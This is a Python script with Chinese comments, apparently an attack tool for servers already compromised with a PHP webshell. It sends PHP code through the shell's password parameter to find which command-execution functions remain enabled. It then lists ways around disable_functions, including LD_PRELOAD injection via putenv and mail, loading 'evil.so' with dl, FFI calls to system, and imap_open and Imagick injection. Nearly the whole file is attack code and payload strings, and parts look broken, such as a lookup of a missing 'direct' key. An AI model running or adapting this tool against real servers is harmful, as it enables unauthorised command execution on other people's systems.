#!/usr/bin/env python3
import requests, re, json, sys, os

BYPASS_METHODS = {
    'pcntl_exec': {'func': 'pcntl_exec', 'risk': 'low', 'desc': '直接执行,参数需为数组'},
    'exec': {'func': 'exec', 'risk': 'low', 'desc': '执行命令,返回最后一行'},
    'system': {'func': 'system', 'risk': 'low', 'desc': '执行并直接输出'},
    'shell_exec': {'func': 'shell_exec', 'risk': 'low', 'desc': '执行并返回全部输出'},
    'passthru': {'func': 'passthru', 'risk': 'low', 'desc': '执行并直接输出(原始)'},
    'popen': {'func': 'popen', 'risk': 'low', 'desc': '单工管道执行'},
    'proc_open': {'func': 'proc_open', 'risk': 'low', 'desc': '双工管道执行,可完全控制'},
    'dl': {'func': 'dl', 'risk': 'medium', 'desc': '加载PHP扩展,需自定义.so/.dll'},
    'mail+putenv': {'func': 'mail', 'risk': 'medium', 'desc': 'LD_PRELOAD注入,需putenv+mail可用'},
    'imap_open': {'func': 'imap_open', 'risk': 'medium', 'desc': 'IMAP命令注入'},
    'imagick': {'func': 'Imagick', 'risk': 'medium', 'desc': 'ImageMagick MVG注入'},
    'ffi': {'func': 'FFI::cdef', 'risk': 'low', 'desc': 'PHP 7.4+,直接调用C函数'},
    'com': {'func': 'COM', 'risk': 'medium', 'desc': 'Windows COM组件(WScript.Shell)'},
    'mem': {'func': '/proc/self/mem', 'risk': 'high', 'desc': '内存写注入(需PHP-FPM/CGI)'},
}

BY_PASS_CLASSIFICATION = {
    'direct': ['system', 'exec', 'shell_exec', 'passthru', 'pcntl_exec', 'popen', 'proc_open'],
    'extension': ['dl', 'ffi', 'com'],
    'ld_preload': ['mail+putenv'],
    'vuln': ['imap_open', 'imagick'],
    'memory': ['mem'],
}

def test_direct_functions(session, url, pass_key):
    """通过webshell逐项测试命令执行函数"""
    available = []
    php_test = '''<?php
$f = '%s';
if(function_exists($f)){ $r=$f('echo 1'); echo "OK_".(is_string($r)?'STR':'NON')."_OK"; }
else echo "NOFUNC";
?>'''
    for name, info in BYPASS_METHODS['direct']:
        try:
            code = php_test % name
            r = session.post(url, data={pass_key: code}, timeout=10)
            if 'OK_' in r.text:
                available.append({**info, 'status': 'available'})
        except: pass
    return available

def check_by_phpinfo(url_or_text):
    """从phpinfo或disable_functions字符串解析"""
    if url_or_text.startswith('http'):
        try:
            r = requests.get(url_or_text, timeout=10)
            html = r.text
        except: return None
    else:
        html = url_or_text

    disabled = []
    m = re.search(r'disable_functions[^>]*>\s*([^<]+)', html, re.I)
    if m:
        disabled = [x.strip() for x in m.group(1).split(',') if x.strip()]

    open_basedir = None
    m2 = re.search(r'open_basedir[^>]*>\s*([^<]+)', html, re.I)
    if m2:
        open_basedir = m2.group(1).strip()

    php_version = None
    m3 = re.search(r'PHP Version\s*</td><td[^>]*>\s*([\d.]+)', html, re.I)
    if m3:
        php_version = m3.group(1)

    return {
        'disabled_functions': disabled,
        'open_basedir': open_basedir,
        'php_version': php_version,
        'sapi': None
    }

def suggest_bypass(phpinfo_result):
    if not phpinfo_result:
        return []
    df = phpinfo_result['disabled_functions']
    ver = phpinfo_result['php_version'] or '0'
    suggestions = []

    if 'pcntl_exec' not in df:
        suggestions.append({'method': 'pcntl_exec', 'desc': '直接使用pcntl_exec执行', 'payload': 'pcntl_exec("/bin/bash", ["-c", "cmd"]);'})
    if 'exec' not in df:
        suggestions.append({'method': 'exec', 'desc': 'exec直接执行', 'payload': 'exec("cmd", $o); print_r($o);'})
    if 'system' not in df:
        suggestions.append({'method': 'system', 'desc': 'system直接执行(推荐)', 'payload': 'system("cmd");'})
    if 'shell_exec' not in df:
        suggestions.append({'method': 'shell_exec', 'desc': 'shell_exec执行', 'payload': 'echo shell_exec("cmd");'})
    if 'passthru' not in df:
        suggestions.append({'method': 'passthru', 'desc': 'passthru执行', 'payload': 'passthru("cmd");'})
    if 'proc_open' not in df:
        suggestions.append({'method': 'proc_open', 'desc': 'proc_open双工管道', 'payload': 'proc_open...'})
    if 'putenv' not in df and 'mail' not in df:
        suggestions.append({'method': 'LD_PRELOAD', 'desc': 'putenv+mail LD_PRELOAD注入', 'payload': 'putenv("LD_PRELOAD=..."); mail("a@b","c","d");'})
    if 'dl' not in df:
        suggestions.append({'method': 'dl', 'desc': 'dl加载扩展', 'payload': 'dl("evil.so");'})
    if ver >= '7.4' and 'FFI' not in str(df):
        suggestions.append({'method': 'FFI', 'desc': 'PHP 7.4+ FFI调用C函数', 'payload': '$ffi=FFI::cdef("int system(char*);"); $ffi->system("cmd");'})
    return suggestions

def check_remote(url, pass_key='cmd'):
    s = requests.Session()
    payload = 'echo "DFUNC_CHECK:"; foreach(get_defined_functions(true)["internal"] as $f){if(preg_match("/^(exec|system|shell_exec|passthru|popen|proc_open|pcntl_exec|putenv|mail|dl|FFI|imap_open)$/",$f))echo $f."\\n";}echo ":DFUNC_END";'
    try:
        r = s.post(url, data={pass_key: payload}, timeout=10)
        m = re.search(r'DFUNC_CHECK:(.*?):DFUNC_END', r.text, re.DOTALL)
        if m:
            available = m.group(1).strip().splitlines()
            info = {'disabled_functions': [], 'open_basedir': None, 'php_version': None, 'sapi': None}
            forbidden = ['system','exec','shell_exec','passthru','popen','proc_open','pcntl_exec','mail','putenv','dl']
            info['disabled_functions'] = [f for f in forbidden if f not in available]
            return info, suggest_bypass(info)
        return None, []
    except Exception as e:
        return None, [{'method': 'error', 'desc': str(e), 'payload': ''}]

if __name__ == '__main__':
    if len(sys.argv) > 1:
        url = sys.argv[1]
        passwd = sys.argv[2] if len(sys.argv) > 2 else 'cmd'
        print(f'[+] 检查: {url}')
        info, suggestions = check_remote(url, passwd)
        if info:
            print(f'[+] PHP版本: {info.get("php_version","unknown")}')
            print(f'[+] 禁用函数: {", ".join(info["disabled_functions"])}')
            print(f'\n[+] 建议绕过方法:')
            for s in suggestions:
                print(f'  - {s["method"]}: {s["desc"]}')
        else:
            print('[-] 连接失败')
